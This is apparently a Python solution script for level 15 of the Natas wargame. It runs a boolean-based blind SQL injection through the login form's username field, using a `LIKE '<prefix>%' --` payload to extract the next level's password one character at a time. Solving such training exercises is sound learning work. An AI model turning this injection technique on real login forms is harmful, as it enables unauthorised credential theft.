import string

from natas.lib import natas_session

session, url = natas_session(15)

POSSIBLE_CHARS = string.ascii_letters + string.digits


def user_exists(password_prefix: str) -> bool:
    payload = {
        "username": f"""natas16" AND BINARY password LIKE '{password_prefix}%' -- """,
        "submit": "Login",
    }
    response = session.post(url + "/index.php", data=payload)
    return "This user exists" in response.text


password = ""
while True:
    found_next_char = False

    for ch in POSSIBLE_CHARS:
        if user_exists(password + ch):
            password += ch
            found_next_char = True
            break

    if not found_next_char:
        break

print(password)
